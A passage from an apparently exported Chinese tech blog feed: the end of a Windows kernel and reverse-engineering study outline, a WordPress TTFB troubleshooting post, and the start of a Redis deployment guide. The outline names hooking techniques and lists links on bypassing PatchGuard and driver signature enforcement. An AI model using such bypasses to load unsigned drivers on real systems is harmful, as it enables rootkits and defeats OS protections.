href="#2-15-RING3-EAT-HOOK-UNHOOK" class="headerlink" title="2.15. RING3 EAT HOOK/UNHOOK"></a>2.15. RING3 EAT HOOK/UNHOOK</h3><p>……</p><h3 id="2-16-RING3-IAT-HOOK-UNHOOK"><a href="#2-16-RING3-IAT-HOOK-UNHOOK" class="headerlink" title="2.16. RING3 IAT HOOK/UNHOOK"></a>2.16. RING3 IAT HOOK/UNHOOK</h3><p>……</p><h3 id="2-17-窗口操作（枚举、发消息、隐藏-显示、启用-禁用等）"><a href="#2-17-窗口操作（枚举、发消息、隐藏-显示、启用-禁用等）" class="headerlink" title="2.17. 窗口操作（枚举、发消息、隐藏/显示、启用/禁用等）"></a>2.17. 窗口操作（枚举、发消息、隐藏/显示、启用/禁用等）</h3><p>……</p><h3 id="2-18-内存操作（枚举、申请、释放、读写、修改保护类型等）"><a href="#2-18-内存操作（枚举、申请、释放、读写、修改保护类型等）" class="headerlink" title="2.18. 内存操作（枚举、申请、释放、读写、修改保护类型等）"></a>2.18. 内存操作（枚举、申请、释放、读写、修改保护类型等）</h3><p>……</p><h3 id="2-19-消息钩子（枚举、删除）"><a href="#2-19-消息钩子（枚举、删除）" class="headerlink" title="2.19. 消息钩子（枚举、删除）"></a>2.19. 消息钩子（枚举、删除）</h3><p>……</p><h3 id="2-20-内核回调表（枚举、清除HOOK）"><a href="#2-20-内核回调表（枚举、清除HOOK）" class="headerlink" title="2.20. 内核回调表（枚举、清除HOOK）"></a>2.20. 内核回调表（枚举、清除HOOK）</h3><p>……</p><h3 id="2-21-枚举句柄"><a href="#2-21-枚举句柄" class="headerlink" title="2.21. 枚举句柄"></a>2.21. 枚举句柄</h3><p>……</p><h3 id="2-22-关闭句柄"><a href="#2-22-关闭句柄" class="headerlink" title="2.22. .关闭句柄"></a>2.22. .关闭句柄</h3><p>……</p><h3 id="2-23-监控进程创建-退出（API-HOOK、回调）"><a href="#2-23-监控进程创建-退出（API-HOOK、回调）" class="headerlink" title="2.23. 监控进程创建/退出（API HOOK、回调）"></a>2.23. 监控进程创建/退出（API HOOK、回调）</h3><p>……</p><h3 id="2-24-监控线程创建-退出（API-HOOK、回调）"><a href="#2-24-监控线程创建-退出（API-HOOK、回调）" class="headerlink" title="2.24. 监控线程创建/退出（API HOOK、回调）"></a>2.24. 监控线程创建/退出（API HOOK、回调）</h3><p>……</p><h3 id="2-25-监控DLL加载（API-HOOK、回调）"><a href="#2-25-监控DLL加载（API-HOOK、回调）" class="headerlink" title="2.25. 监控DLL加载（API HOOK、回调）"></a>2.25. 监控DLL加载（API HOOK、回调）</h3><p>……</p><h2 id="3-文件相关"><a href="#3-文件相关" class="headerlink" title="3. 文件相关"></a>3. 文件相关</h2><h3 id="3-1-API层文件操作（枚举、复制、删除、重命名）"><a href="#3-1-API层文件操作（枚举、复制、删除、重命名）" class="headerlink" title="3.1. API层文件操作（枚举、复制、删除、重命名）"></a>3.1. API层文件操作（枚举、复制、删除、重命名）</h3><p>……</p><h3 id="3-2-FSD层文件操作（枚举、复制、删除、重命名）"><a href="#3-2-FSD层文件操作（枚举、复制、删除、重命名）" class="headerlink" title="3.2. FSD层文件操作（枚举、复制、删除、重命名）"></a>3.2. FSD层文件操作（枚举、复制、删除、重命名）</h3><p>……</p><h3 id="3-3-DISK层文件操作（读写）"><a href="#3-3-DISK层文件操作（读写）" class="headerlink" title="3.3. DISK层文件操作（读写）"></a>3.3. DISK层文件操作（读写）</h3><p>……</p><h3 id="3-4-解析NTFS-FAT32"><a href="#3-4-解析NTFS-FAT32" class="headerlink" title="3.4. 解析NTFS/FAT32"></a>3.4. 解析NTFS/FAT32</h3><p>……</p><h3 id="3-5-监控文件操作（API-HOOK、SFILTER、MINIFILTER）"><a href="#3-5-监控文件操作（API-HOOK、SFILTER、MINIFILTER）" class="headerlink" title="3.5. 监控文件操作（API HOOK、SFILTER、MINIFILTER）"></a>3.5. 监控文件操作（API HOOK、SFILTER、MINIFILTER）</h3><p>……</p><h2 id="4-注册表相关"><a href="#4-注册表相关" class="headerlink" title="4. 注册表相关"></a>4. 注册表相关</h2><h3 id="4-1-API层注册表操作（枚举、新建、删除、重命名）"><a href="#4-1-API层注册表操作（枚举、新建、删除、重命名）" class="headerlink" title="4.1. API层注册表操作（枚举、新建、删除、重命名）"></a>4.1. API层注册表操作（枚举、新建、删除、重命名）</h3><p>……</p><h3 id="4-2-解析HIVE操作注册表"><a href="#4-2-解析HIVE操作注册表" class="headerlink" title="4.2. 解析HIVE操作注册表"></a>4.2. 解析HIVE操作注册表</h3><p>……</p><h3 id="4-3-监控注册表操作（API-HOOK、回调、DKOH）"><a href="#4-3-监控注册表操作（API-HOOK、回调、DKOH）" class="headerlink" title="4.3. 监控注册表操作（API HOOK、回调、DKOH）"></a>4.3. 监控注册表操作（API HOOK、回调、DKOH）</h3><p>……</p><h2 id="5-HOOK相关"><a href="#5-HOOK相关" class="headerlink" title="5. HOOK相关"></a>5. HOOK相关</h2><h3 id="5-1-SSDT-HOOK-UNHOOK（包括SHADOW-SSDT）"><a href="#5-1-SSDT-HOOK-UNHOOK（包括SHADOW-SSDT）" class="headerlink" title="5.1. SSDT HOOK/UNHOOK（包括SHADOW SSDT）"></a>5.1. SSDT HOOK/UNHOOK（包括SHADOW SSDT）</h3><p>……</p><h3 id="5-2-INLINE-HOOK-UNHOOK-绕过（多种方法）"><a href="#5-2-INLINE-HOOK-UNHOOK-绕过（多种方法）" class="headerlink" title="5.2. INLINE HOOK/UNHOOK/绕过（多种方法）"></a>5.2. INLINE HOOK/UNHOOK/绕过（多种方法）</h3><p>……</p><h3 id="5-3-IRP-HOOK"><a href="#5-3-IRP-HOOK" class="headerlink" title="5.3. IRP HOOK"></a>5.3. IRP HOOK</h3><p>……</p><h3 id="5-4-OBJECT-HOOK-UNHOOK"><a href="#5-4-OBJECT-HOOK-UNHOOK" class="headerlink" title="5.4. OBJECT HOOK/UNHOOK"></a>5.4. OBJECT HOOK/UNHOOK</h3><p>……</p><h3 id="5-5-IDT-HOOK-UNHOOK"><a href="#5-5-IDT-HOOK-UNHOOK" class="headerlink" title="5.5. IDT HOOK/UNHOOK"></a>5.5. IDT HOOK/UNHOOK</h3><p>……</p><h3 id="5-6-EAT-HOOK-UNHOOK"><a href="#5-6-EAT-HOOK-UNHOOK" class="headerlink" title="5.6. EAT HOOK/UNHOOK"></a>5.6. EAT HOOK/UNHOOK</h3><p>……</p><h3 id="5-7-IAT-HOOK-UNHOOK"><a href="#5-7-IAT-HOOK-UNHOOK" class="headerlink" title="5.7. IAT HOOK/UNHOOK"></a>5.7. IAT HOOK/UNHOOK</h3><p>……</p><h3 id="5-8-MSR-HOOK-UNHOOK"><a href="#5-8-MSR-HOOK-UNHOOK" class="headerlink" title="5.8. MSR HOOK/UNHOOK"></a>5.8. MSR HOOK/UNHOOK</h3><p>……</p><h2 id="6-内核相关"><a href="#6-内核相关" class="headerlink" title="6. 内核相关"></a>6. 内核相关</h2><h3 id="6-1-枚举内核模块（链表、目录对象、暴搜）"><a href="#6-1-枚举内核模块（链表、目录对象、暴搜）" class="headerlink" title="6.1. 枚举内核模块（链表、目录对象、暴搜）"></a>6.1. 枚举内核模块（链表、目录对象、暴搜）</h3><p>……</p><h3 id="6-2-监控驱动加载（API-HOOK、回调）"><a href="#6-2-监控驱动加载（API-HOOK、回调）" class="headerlink" title="6.2. 监控驱动加载（API HOOK、回调）"></a>6.2. 监控驱动加载（API HOOK、回调）</h3><p>……</p><h3 id="6-3-枚举-删除回调（进程、线程、映像、注册表、蓝屏、关机、对象、文件系统改变）"><a href="#6-3-枚举-删除回调（进程、线程、映像、注册表、蓝屏、关机、对象、文件系统改变）" class="headerlink" title="6.3. 枚举/删除回调（进程、线程、映像、注册表、蓝屏、关机、对象、文件系统改变）"></a>6.3. 枚举/删除回调（进程、线程、映像、注册表、蓝屏、关机、对象、文件系统改变）</h3><p>……</p><h3 id="6-4-枚举-删除定时器（IO-DPC）"><a href="#6-4-枚举-删除定时器（IO-DPC）" class="headerlink" title="6.4. 枚举/删除定时器（IO/DPC）"></a>6.4. 枚举/删除定时器（IO/DPC）</h3><p>……</p><h3 id="6-5-枚举GDT"><a href="#6-5-枚举GDT" class="headerlink" title="6.5. 枚举GDT"></a>6.5. 枚举GDT</h3><p>……</p><h2 id="7-网络相关"><a href="#7-网络相关" class="headerlink" title="7. 网络相关"></a>7. 网络相关</h2><h3 id="7-1-内核网络通信（TDI、WSK）"><a href="#7-1-内核网络通信（TDI、WSK）" class="headerlink" title="7.1. 内核网络通信（TDI、WSK）"></a>7.1. 内核网络通信（TDI、WSK）</h3><p>……</p><h3 id="7-2-监控网络通信（WFP、TDI-HOOK、NDIS-HOOK、NDIS-FILTER）"><a href="#7-2-监控网络通信（WFP、TDI-HOOK、NDIS-HOOK、NDIS-FILTER）" class="headerlink" title="7.2. 监控网络通信（WFP、TDI HOOK、NDIS HOOK、NDIS FILTER）"></a>7.2. 监控网络通信（WFP、TDI HOOK、NDIS HOOK、NDIS FILTER）</h3><p>……</p><h3 id="7-3-枚举网络连接（API方法、发IRP法）"><a href="#7-3-枚举网络连接（API方法、发IRP法）" class="headerlink" title="7.3. 枚举网络连接（API方法、发IRP法）"></a>7.3. 枚举网络连接（API方法、发IRP法）</h3><p>……</p><h3 id="7-4-枚举-挂钩NDIS处理函数"><a href="#7-4-枚举-挂钩NDIS处理函数" class="headerlink" title="7.4. 枚举/挂钩NDIS处理函数"></a>7.4. 枚举/挂钩NDIS处理函数</h3><p>……</p><h3 id="7-5-流量统计-下载限速"><a href="#7-5-流量统计-下载限速" class="headerlink" title="7.5. 流量统计/下载限速"></a>7.5. 流量统计/下载限速</h3><p>……</p><h3 id="7-6-端口复用"><a href="#7-6-端口复用" class="headerlink" title="7.6. 端口复用"></a>7.6. 端口复用</h3><p>……</p><h2 id="8-64位系统专用"><a href="#8-64位系统专用" class="headerlink" title="8. 64位系统专用"></a>8. 64位系统专用</h2><h3 id="8-1-破解PATCHGUARD（动态-静态）"><a href="#8-1-破解PATCHGUARD（动态-静态）" class="headerlink" title="8.1. 破解PATCHGUARD（动态/静态）"></a>8.1. 破解PATCHGUARD（动态/静态）</h3><ul><li>《<a href="https://bbs.pediy.com/thread-187214.htm" target="_blank" rel="nofollow">过Patchguard的梗</a>》</li><li>《<a href="http://www.mengwuji.net/thread-2398-1-1.html" target="_blank" rel="nofollow">过patchguard源码</a>》</li><li>《<a href="http://www.m5home.com/bbs/thread-5893-1-1.html" target="_blank" rel="nofollow">在Win7x64上加载无签名驱动以及让PatchGuard失效(Win7x64内核越狱)</a>》</li><li>《<a href="https://bbs.pediy.com/thread-158157.htm" target="_blank" rel="nofollow">让PatchGuard变狗屎的那些方法</a>》</li></ul><h3 id="8-2-破解DSE（动态-静态）"><a href="#8-2-破解DSE（动态-静态）" class="headerlink" title="8.2. 破解DSE（动态/静态）"></a>8.2. 破解DSE（动态/静态）</h3><ul><li>《<a href="http://www.m5home.com/bbs/thread-7870-1-1.html" target="_blank" rel="nofollow">攻破WIN7~WIN10的KPP和DSE（WIN64内核越狱）</a>》</li><li>《<a href="http://www.m5home.com/bbs/thread-7880-1-1.html" target="_blank" rel="nofollow">WIN64免签名加载驱动SDK</a>》</li><li>《<a href="http://www.m5home.com/bbs/forum.php?mod=viewthread&amp;tid=8134" target="_blank" rel="nofollow">神奇的内核路径欺骗</a>》</li><li>《<a href="http://www.m5home.com/bbs/thread-7390-1-1.html" target="_blank" rel="nofollow">Win7x64全自动无提示破解PatchGuard和Driver Signature Enforcement</a>》</li><li>《<a href="http://www.m5home.com/bbs/thread-7845-1-1.html" target="_blank" rel="nofollow">在Win64系统上动态加载无签名驱动：WIN64UDL</a>》</li><li>《<a href="http://blog.csdn.net/zhuhuibeishadiao/article/details/51055046" target="_blank" rel="nofollow">Win7 x64动态开启DSE</a>》</li></ul><h2 id="9-杂项"><a href="#9-杂项" class="headerlink" title="9. 杂项"></a>9. 杂项</h2><h3 id="9-1-对象劫持"><a href="#9-1-对象劫持" class="headerlink" title="9.1. 对象劫持"></a>9.1. 对象劫持</h3><p>……</p><h3 id="9-2-符号操作"><a href="#9-2-符号操作" class="headerlink" title="9.2. 符号操作"></a>9.2. 符号操作</h3><p>……</p><h3 id="9-3-PE解析"><a href="#9-3-PE解析" class="headerlink" title="9.3. PE解析"></a>9.3. PE解析</h3><p>……</p><h3 id="9-4-反调试"><a href="#9-4-反调试" class="headerlink" title="9.4. 反调试"></a>9.4. 反调试</h3><p>……</p><h2 id="10-整体项目"><a href="#10-整体项目" class="headerlink" title="10. 整体项目"></a>10. 整体项目</h2><h3 id="10-1-PE工具"><a href="#10-1-PE工具" class="headerlink" title="10.1. PE工具"></a>10.1. PE工具</h3><p>……</p><h3 id="10-2-ARK"><a href="#10-2-ARK" class="headerlink" title="10.2. ARK"></a>10.2. ARK</h3><p>……</p><h3 id="10-3-调试器"><a href="#10-3-调试器" class="headerlink" title="10.3. 调试器"></a>10.3. 调试器</h3><p>……</p><h3 id="10-4-主动防御"><a href="#10-4-主动防御" class="headerlink" title="10.4. 主动防御"></a>10.4. 主动防御</h3><p>……</p><h3 id="10-5-沙箱"><a href="#10-5-沙箱" class="headerlink" title="10.5. 沙箱"></a>10.5. 沙箱</h3><p>……</p><h3 id="10-6-透明加密"><a href="#10-6-透明加密" class="headerlink" title="10.6. 透明加密"></a>10.6. 透明加密</h3><p>……</p><h3 id="10-7-VT级调试-反调试-主动防御"><a href="#10-7-VT级调试-反调试-主动防御" class="headerlink" title="10.7. VT级调试/反调试/主动防御"></a>10.7. VT级调试/反调试/主动防御</h3><p>……</p><h2 id="11-其他"><a href="#11-其他" class="headerlink" title="11. 其他"></a>11. 其他</h2><h3 id="11-1-MFC开发"><a href="#11-1-MFC开发" class="headerlink" title="11.1. MFC开发"></a>11.1. MFC开发</h3><ul><li>《<a href="https://www.cnblogs.com/findumars/p/6275607.html" target="_blank" rel="nofollow">VS2010/MFC编程入门教程之目录和总结</a>》</li><li>《<a href="http://www.jizhuomi.com/school/c/159.html" target="_blank" rel="nofollow">VS2010/MFC编程入门</a>》</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CE </tag>
            
            <tag> RING </tag>
            
            <tag> HOOK </tag>
            
            <tag> 驱动 </tag>
            
            <tag> 内核 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WP 站点的 TTFB 过长？记一次 TTFB 的优化过程</title>
      <link href="/articles/website/ji-yi-ci-ttfb-de-you-hua-guo-cheng/"/>
      <url>/articles/website/ji-yi-ci-ttfb-de-you-hua-guo-cheng/</url>
      
        <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>最近发现打开网站的响应时间变得很长，在浏览器通过F12打开控制台发现TTFB高达6秒。</p><p>而且经测试发现，不仅站点<strong>所有页面</strong>打开时的TTFB都需要6秒，连打开<strong>站点后台</strong>的TTFB也是固定6秒。</p><p><img src="./01.png"></p><h2 id="科普"><a href="#科普" class="headerlink" title="科普"></a>科普</h2><p>首先简单解析下，什么是TTFB？</p><p>TTFB (Time To First Byte)，是最初的网络请求被发起到从服务器接收到第一个字节这段时间，它包含了TCP连接时间，发送HTTP请求时间和获得响应消息第一个字节的时间。</p><h2 id="推测"><a href="#推测" class="headerlink" title="推测"></a>推测</h2><p>查询很多处理TTFB过慢文章，很多都是说减少DNS、使用CDN、提高服务器性能、甚至还与各个地区访问服务器的延迟状态等等方法。</p><p>但是经过初步测试，我判断并不是上面的原因引起的，这是因为：</p><ul><li>直接通过IP访问站点（即跳过DNS解析），TTFB依旧是6秒</li><li>把站点展示的内容（图文数据）完全克隆到另一台测试服务器（性能比正式服务器低），TTFB只有不到1秒</li><li>我的测试服务器和正式服务器是同一地区的，而测试服能达到秒级响应，说明不是地域问题</li></ul><p>但有个地方引起我的关注：</p><blockquote><p>正式服务器前后台的TTFB均是6秒，克隆内容后的测试服务器TTFB不到1秒</p></blockquote><p>因此我初步分析，很有可能在我打开站点的时候，<strong>站点做了某个行为</strong>，这个行为不论在我打开站点前台还是后台都会触发的，而这个行为跟我站点的展示内容无关。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>那么如何定位到这个行为是什么就是关键了。</p><p>考虑到TTFB的特点，这个行为要么发生在“TCP连接时间”，要么发生在“发送HTTP请求时间和获得响应消息第一个字节的时间”。但是发现站点的ping延迟并不高，因此嫌疑最重的就是后者。</p><p>但是就一般而言，站点收到HTTP请求并不会执行什么特殊操作，但是为了展示界面，一定会做的就是<strong>数据库访问</strong>，因此为了进一步定位是否为数据库导致的，<font color="red">我需要知道在访问网站的同时，站点执行了哪些SQL，每条SQL耗时多长</font>。</p><p>为此，查看<strong>数据库日志</strong>是最直接的。</p><p>一般情况下，WP使用的是 mysql/mariadb ，数据库日志默认是关闭的，因此需要先激活日志功能：</p><p>使用root用户登陆到数据库后，检查“数据库日志”是否开启：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SHOW</span> VARIABLES <span class="token operator">LIKE</span> <span class="token string">'general%'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"># 这份日志会保存到数据库的安装目录， Centos7默认的目录是 /var/lib/mysql/</span><span class="token operator">+</span><span class="token comment" spellcheck="true">------+-----------+  </span><span class="token operator">|</span> Variable_name <span class="token operator">|</span> <span class="token keyword">Value</span> <span class="token operator">|</span>  <span class="token operator">+</span><span class="token comment" spellcheck="true">------+-----------+  </span><span class="token operator">|</span> general_log <span class="token operator">|</span> <span class="token keyword">OFF</span> <span class="token operator">|</span>  <span class="token operator">|</span> general_log_file <span class="token operator">|</span> VM_211_224_centos<span class="token punctuation">.</span>log <span class="token operator">|</span>  <span class="token operator">+</span><span class="token comment" spellcheck="true">------+-----------+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>若为OFF，则开启之（这个选项的作用是把<strong>所有SQL操作</strong>打印到日志）：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SET</span> <span class="token keyword">GLOBAL</span> general_log<span class="token operator">=</span><span class="token string">'ON'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"># 当调试完毕后记得关闭之，否则太耗服务器资源了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>另外，还有一个相关的“慢查询日志”，检查是否开启：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SHOW</span> VARIABLES <span class="token operator">LIKE</span> <span class="token string">'%slow_query_log%'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"># 这份日志会保存到数据库的安装目录， Centos7默认的目录是 /var/lib/mysql/</span><span class="token operator">+</span><span class="token comment" spellcheck="true">---------+----+  </span><span class="token operator">|</span> Variable_name <span class="token operator">|</span> <span class="token keyword">Value</span> <span class="token operator">|</span>  <span class="token operator">+</span><span class="token comment" spellcheck="true">---------+----+  </span><span class="token operator">|</span> slow_query_log <span class="token operator">|</span> <span class="token keyword">OFF</span> <span class="token operator">|</span>  <span class="token operator">|</span> slow_query_log_file <span class="token operator">|</span> VM_211_224_centos<span class="token operator">-</span>slow<span class="token punctuation">.</span>log <span class="token operator">|</span>  <span class="token operator">+</span><span class="token comment" spellcheck="true">---------+----+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>若为OFF，则开启之（这个选项的作用是把<strong>执行时间超过一定数值的SQL</strong>打印到日志）：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SET</span> <span class="token keyword">GLOBAL</span> slow_query_log<span class="token operator">=</span><span class="token string">'ON'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"># 当调试完毕后记得关闭之，否则太耗服务器资源了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>无需重启数据库，直接刷新站点，发现 <code>VM_211_224_centos.log</code> 日志有内容，<code>VM_211_224_centos-slow.log</code>日志无内容（当然这是针对我的情况而言，mysql/mariadb默认超过10秒的SQL才是慢查询，后者没日志很可能就是因为并不存在这类SQL）。</p><p>虽然 <code>VM_211_224_centos.log</code> 日志有内容，但也仅仅是一股脑把所有SQL列印出来而已，并不能反映每条SQL的执行时长。</p><p>但是这里可以<font color="red">通过<code>tail -f</code>实时直播日志的打印</font>，以判断执行哪些SQL时会有停顿：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tail</span> -10f /var/lib/mysql/VM_211_224_centos.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="./02.png"></p><p>刷新网站后，发现日志只在这个SQL执行的时候出现卡顿：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> meta_value <span class="token keyword">FROM</span> wp_clean_up_optimizer_meta <span class="token keyword">WHERE</span> meta_key<span class="token operator">=</span><span class="token string">'other_settings'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我马上就发现，<code>wp_clean_up_optimizer_meta</code>这张表是属于之前安装的数据库优化插件【Clean Up Optimizer】的。检查这张表的数据，存储了约4000条<code>recent_login_data</code>，而<font color="red">这些数据记录的是近期发生过的登陆行为</font>，且含有不少长文本：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> wp_clean_up_optimizer_meta <span class="token keyword">where</span> meta_key <span class="token operator">=</span> <span class="token string">'recent_login_data'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>检查插件【Clean Up Optimizer】，确实<strong>有记录近期尝试登陆的用户信息</strong>的功能，且这个功能无法关闭。</p><p>而我相信任何一个作为WP的站长，都很清楚<strong>每天被大量机器人尝试登陆自己的站点</strong>已经不是什么鲜为人知的秘密。</p><p>为此带来的问题就是<code>wp_clean_up_optimizer_meta</code>表会因为这些<strong>无效登陆</strong>而<strong>日益膨胀</strong>。</p><p>虽然我不清楚这个插件有什么理由需要在每次打开站点页面时都去查询这张表，但是任由这张表去膨胀而不加约束、甚至不提供功能开关、还不加索引查询，都是很蠢的行为，而<strong>这正是导致这一系列问题的元凶</strong>。</p><p>于是，<font color="red">我停用了这个插件，现在打开任意页面，TTFB都降低到秒级了</font>。</p><p><img src="./03.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>需知道，每个站点TTFB变慢都可能有其特殊原因，并不能一概而论地去烦恼DNS、CDN等问题。</p><p>文本只是根据我的经验，提供一个排查思路，仅供参考。</p><p>最后，我给这个插件的作者发了一封邮件，这个事情就这么解决了。</p><p>但是讽刺的是，作为一个数据库优化的插件，却因为数据库的问题成为了网站访问延迟的元凶，看来我们也不能太过依赖一些便利的工具了。但我又转念一想，杀软和病毒，也不恰恰正是因为这种相互依赖关系才得以共存么？呵。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WordPress </tag>
            
            <tag> TTFB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis 部署笔记（单机 + 主从 + 哨兵 + 集群）</title>
      <link href="/articles/db/redis-bu-shu-bi-ji/"/>
      <url>/articles/db/redis-bu-shu-bi-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p>Redis是一个开源，高级的键值存储和一个适用的解决方案，用于构建高性能，可扩展的Web应用程序。它有三个主要特点，使其优越于其它键值数据存储系统：</p><ul><li>Redis将其数据库完全保存在内存中，仅使用磁盘进行持久化。</li><li>与其它键值数据存储相比，Redis有一组相对丰富的数据类型。</li><li>Redis可以将数据复制到任意数量的从机中。</li></ul><h2 id="2-部署声明"><a href="#2-部署声明" class="headerlink" title="2. 部署声明"></a>2. 部署声明</h2><p>本文基于<font color="red">Centos7系统</font>，由浅入深讲解如何部署Redis的<strong>四种模式</strong>，分别是：<strong>单机模式、主从模式、哨兵模式、集群模式</strong>。</p><p>需注意，这里<strong>因为只用于教学演示</strong>，所以<strong>这四种模式都是部署在同一台Centos机器上的</strong>（通过不同的服务端口区分不同的Redis实例）。实际使用时，一般会使用多台机器部署，此时只需要对应修改IP即可，部署过程是一样的。</p><h2 id="3-前置环境部署"><a href="#3-前置环境部署" class="headerlink" title="3. 前置环境部署"></a>3. 前置环境部署</h2><p>如果只是部署Redis【单机模式/主从模式/哨兵模式】，是不需要安装这个前置环境的。</p><p>如果要部署Redis【集群模式（Redis Cluster）】，建议先装完这个前置环境才往下阅读。</p><p>这是因为Redis Cluster需要使用ruby脚本构建。虽然Centos7自带了ruby支持库的安装源，但是版本过低（只是2.0.0版本），<strong>Redis要求ruby的版本至少为2.2.2</strong>。安装方法如下：</p><pre class="line-numbers language-bash"><code class="language-bash">yum <span class="token function">install</span> centos-release-scl-rh　　　　　<span class="token comment" spellcheck="true"># 会在/etc/yum.repos.d/目录多出一个CentOS-SCLo-scl-rh.repo源</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先更换yum源安装2.3版本的ruby：</p><pre class="line-numbers language-bash"><code class="language-bash">yum <span class="token function">install</span> rh-ruby23 -yscl <span class="token function">enable</span> rh-ruby23 <span class="token function">bash</span>　　　　　<span class="token comment" spellcheck="true"># 临时变更当前环境变量的ruby版本为2.3（重启后失效）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>这种安装方式是使得ruby2.0和2.3版本并存，并非升级ruby。 之后若要再使用2.3版本的ruby，需再次执行<code>scl enable rh-ruby23 bash</code>命令。</p></blockquote><p>查看ruby版本：</p><pre class="line-numbers language-bash"><code class="language-bash">ruby -v<span class="token comment" spellcheck="true"># ruby 2.3.6p384 (2017-12-14 revision 61254) [x86_64-linux]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>安装gem：</p><pre class="line-numbers language-bash"><code class="language-bash">yum <span class="token function">install</span> rubygems -y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装ruby的redis包（用于redis通讯）：</p><pre class="line-numbers language-bash"><code class="language-bash">gem <span class="token function">install</span> redis<span class="token comment" spellcheck="true"># 若前面安装ruby版本过低就会报错：</span><span class="token comment" spellcheck="true"># ERROR:  Error installing redis:</span><span class="token comment" spellcheck="true">#         redis requires Ruby version >= 2.2.2.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看gem版本：</p><pre class="line-numbers language-bash"><code class="language-bash">gem -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><font color="red">至此前置环境就安装完成了，下面开始讲述Redis四种模式的部署。</font></p><h2 id="4-单机模式"><a href="#4-单机模式" class="headerlink" title="4. 单机模式"></a>4. 单机模式</h2><h3 id="4-1-简介"><a href="#4-1-简介" class="headerlink" title="4.1. 简介"></a>4.1. 简介</h3><p>单机模式是Redis最基本的模式，之后的主从、哨兵、集群模式都是据此扩展而来。而且在开发环境下，出于方便起见，一般部署单机模式即可满足调试要求。</p><h3 id="4-2-安装"><a href="#4-2-安装" class="headerlink" title="4.2. 安装"></a>4.2. 安装</h3><p>到官网下载最新版，本文下载的版本是<font color="red">redis-4.0.10.tar.gz</font> ：</p><blockquote><p>中文官网：<a href="http://www.redis.cn/">http://www.redis.cn/</a><br>英文官网（需翻墙）：<a href="https://redis.io/">https://redis.io/</a></p></blockquote><p>上传到Centos服务器，本文上传位置为：</p><blockquote><p><font color="red">/usr/local</font>/redis-4.0.10.tar.gz</p></blockquote><p>解压安装包：</p><blockquote><p>tar -zxvf redis-4.0.10.tar.gz</p></blockquote><p>由于Redis需要编译安装，先安装gcc编译环境：</p><blockquote><p>yum install gcc</p></blockquote><p>进入Redis安装目录：</p><blockquote><p>cd <font color="red">/usr/local/redis-4.0.10/</font></p></blockquote><p>编译：</p><blockquote><p>make MALLOC=libc</p></blockquote><p>编译完成后，进入src目录：</p><blockquote><p>cd /usr/local/redis-4.0.10/src/</p></blockquote><p>把 src 目录下的文件安装到 /usr/local/bin ：</p><blockquote><p>make install</p></blockquote><h3 id="4-3-部署"><a href="#4-3-部署" class="headerlink" title="4.3. 部署"></a>4.3. 部署</h3><p>默认情况下，Redis是通过以下方式启动/停止的：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/local/redis-4.0.10/src/　　<span class="token comment" spellcheck="true"># 切换到启动脚本目录</span>./redis-server <span class="token punctuation">..</span>/redis.conf　　　　<span class="token comment" spellcheck="true"># 启动Redis</span>Ctrl + C　　　　　　　　　　　　　　　　<span class="token comment" spellcheck="true"># 停止Redis</span><span aria-hidden="true" 